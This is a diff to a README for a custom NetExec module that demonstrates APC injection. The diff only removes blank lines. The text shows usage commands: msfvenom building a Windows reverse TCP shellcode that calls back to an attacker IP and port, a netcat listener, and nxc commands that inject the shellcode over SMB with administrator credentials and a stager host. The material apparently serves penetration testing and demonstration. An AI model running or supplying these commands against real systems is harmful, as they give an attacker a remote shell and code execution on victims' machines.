@@ -12,22 +12,17 @@ This custom module is designed as part of an NetExec to demonstrate APC Injectio
 Create a shellcode using msfvenom or another tool.
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.21.237 LPORT=9001 -f raw -o shellcode.bin
-
 ```
 Start your listener.
 ```bash
-
 nc -lvnp 9001
-
 ```
 Execute nxc with module APC Injection.
 
 ```bash
 nxc smb <TARGETIP> -u <username> -p <password> -M apc-inj -o KEY=<KEY> SHELLCODE=<shellcode.bin> STAGER=<stager_ip>
 
-
 nxc smb 192.168.1.100 -u Administrator -p Password -M apc-inj -o KEY=key123 SHELLCODE=msfvenom.bin STAGER=192.168.1.200
-
 
 ```
 
